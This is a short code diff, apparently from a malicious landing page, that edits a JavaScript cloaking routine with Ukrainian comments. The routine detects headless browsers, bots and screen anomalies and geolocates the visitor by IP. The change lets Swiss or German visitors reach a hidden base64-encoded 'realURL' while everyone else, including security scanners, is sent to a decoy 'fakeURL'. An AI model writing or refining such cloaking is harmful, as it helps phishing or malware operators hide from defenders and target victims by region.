@@ -18,7 +18,8 @@
       .then(response => response.json())
       .then(data => {
         const country = data.country_code;
-        const isMod = isHeadless || isBot || screenCheck || country !== "CH";
+        // Дозволяємо лише IP з DE або CH
+        const isMod = isHeadless || isBot || screenCheck || !(country === "CH" || country === "DE");
 
         const target = atob(isMod ? fakeURL : realURL);
         setTimeout(() => {
@@ -26,7 +27,7 @@
         }, 3000);
       })
       .catch(() => {
-        // Якщо API не працює — перенаправити на фейковий сайт
+        // Якщо API не працює — редирект на фейковий сайт
         location.replace(atob(fakeURL));
       });
   </script>
